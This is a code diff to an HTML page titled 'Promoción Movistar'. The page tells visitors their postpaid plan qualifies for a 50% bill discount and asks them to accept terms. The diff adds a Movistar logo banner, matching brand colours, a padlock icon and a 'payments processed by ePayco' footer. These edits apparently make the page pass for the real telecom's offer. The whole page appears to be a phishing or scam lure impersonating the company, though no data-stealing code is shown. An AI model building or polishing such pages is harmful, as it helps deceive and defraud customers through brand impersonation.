@@ -6,30 +6,46 @@
   <title>Promoción Movistar</title>
   <style>
     body {
-      background: #0a0f2c;
-      color: #fff;
+      background: #f5f9fc;
+      color: #333;
       font-family: Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    header {
+      background: #019DF4;
+      padding: 10px 20px;
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      margin: 0;
+    }
+    header img {
+      height: 50px;
+    }
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
     }
     .card {
-      background: linear-gradient(180deg,#12203f,#0e1630);
+      background: linear-gradient(180deg,#ffffff,#e6f6ff);
       padding: 28px;
-      border-radius: 12px;
+      border-radius: 16px;
       width: 380px;
-      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
       text-align: center;
     }
     h2 { 
       margin: 0 0 12px; 
-      color: #cfefff; 
+      color: #019DF4; 
     }
     p { 
       margin: 0 0 18px; 
-      color: #b7dff6; 
+      color: #444; 
       font-size: 0.95rem; 
       line-height: 1.4; 
     }
@@ -38,12 +54,12 @@
       align-items: center;
       gap: 8px;
       font-size: 0.9rem;
-      color: #cfefff;
+      color: #333;
       margin: 16px 0;
       text-align: left;
     }
     input[type="checkbox"] {
-      accent-color: #4fc3f7;
+      accent-color: #019DF4;
       width: 18px;
       height: 18px;
     }
@@ -61,29 +77,61 @@
       font-weight: 700;
       font-size: 0.95rem;
     }
-    .accept { background: #4fc3f7; color: #041028; }
+    .accept { background: #5bc500; color: #fff; }
     .cancel { background: #263648; color: #cfefff; }
-    .msg { margin-top:12px; font-size:0.95rem; color:#d0eefd; }
+    .msg { margin-top:12px; font-size:0.95rem; color:#019DF4; }
+    footer {
+      background: #f0f0f0;
+      padding: 10px 20px;
+      text-align: center;
+      font-size: 0.85rem;
+      color: #444;
+    }
+    footer img {
+      height: 16px;
+      vertical-align: middle;
+      margin: 0 4px;
+    }
+    .lock-icon {
+      height: 18px;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>¡Genial!</h2>
-    <p>Tu plan pospago es válido para la promoción del <b>50% de descuento</b> en tu factura.</p>
-    <p>Acepta los términos y condiciones para continuar.</p>
+  <!-- Banner -->
+  <header>
+    <img src="img/descarga.png" alt="Logo Movistar">
+  </header>
 
-    <div class="terms">
-      <input type="checkbox" id="tyc" />
-      <label for="tyc">Acepto los términos y condiciones</label>
+  <!-- Contenido -->
+  <main>
+    <div class="card">
+      <h2>¡Genial!</h2>
+      <p>Tu plan pospago es válido para la promoción del <b>50% de descuento</b> en tu factura.</p>
+      <p>Acepta los términos y condiciones para continuar.</p>
+
+      <div class="terms">
+        <input type="checkbox" id="tyc" />
+        <label for="tyc">Acepto los términos y condiciones</label>
+      </div>
+
+      <div class="actions">
+        <button class="cancel" id="volver">Volver</button>
+        <button class="accept" id="continuar">Continuar</button>
+      </div>
+
+      <div class="msg" id="msg"></div>
     </div>
+  </main>
 
-    <div class="actions">
-      <button class="cancel" id="volver">Volver</button>
-      <button class="accept" id="continuar">Continuar</button>
-    </div>
-
-    <div class="msg" id="msg"></div>
-  </div>
+  <!-- Footer -->
+  <footer>
+    <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png" alt="Candado" class="lock-icon">
+    Pagos procesados por 
+    <img src="img/logo_ePayco.1722863467828.png" alt="ePayco">
+  </footer>
 
   <script>
     document.getElementById('volver').addEventListener('click', () => {
@@ -101,7 +149,7 @@
 
       msgEl.textContent = "Procesando aceptación...";
 
-      // Aquí puedes guardar el estado en localStorage o enviarlo a tu servidor
+      // Guardar estado en localStorage
       localStorage.setItem("promoAceptada", "true");
 
       setTimeout(() => {
